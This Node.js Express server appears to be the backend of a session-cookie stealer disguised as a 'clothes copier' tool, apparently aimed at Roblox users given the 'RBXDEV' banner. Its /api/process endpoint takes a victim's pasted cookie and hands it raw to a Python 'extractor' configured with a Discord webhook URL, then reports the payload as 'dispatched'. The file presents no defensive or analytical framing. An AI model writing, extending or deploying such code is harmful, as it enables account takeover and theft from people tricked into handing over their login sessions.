const express = require('express');
const path = require('path');
const { spawn } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/clothes-copier', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'clothes-copier.html'));
});

app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

// API Processing Endpoint
app.post('/api/process', (req, res) => {
    // Support both req.body.cookie and req.body.data flexibly
    const rawCookie = req.body.cookie || req.body.data;

    if (!rawCookie) {
        return res.status(400).json({ success: false, error: 'No cookie provided' });
    }

    const cookieStr = String(rawCookie).trim();

    // SAFE DEBUG LOG (Node): Length and first 12 chars ONLY
    console.log(`[Node Debug] Received from request -> Length: ${cookieStr.length}, Start: ${cookieStr.substring(0, 12)}...`);

    // Pass raw string directly (NO base64 encoding)
    const pythonProcess = spawn('python3', ['core_extractor.py', cookieStr], {
        env: {
            ...process.env,
            DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL
        }
    });

    let stderrData = '';

    pythonProcess.stderr.on('data', (chunk) => {
        stderrData += chunk.toString();
        console.log(`[Python Log] ${chunk.toString().trim()}`);
    });

    pythonProcess.on('close', (code) => {
        if (code === 0) {
            res.json({ success: true, message: 'Payload processed and dispatched successfully.' });
        } else {
            res.status(500).json({ 
                success: false, 
                error: 'Extractor execution failed.', 
                details: stderrData.trim() 
            });
        }
    });
});

app.listen(PORT, () => {
    console.log(`🚀 RBXDEV Server running live on port ${PORT}`);
});
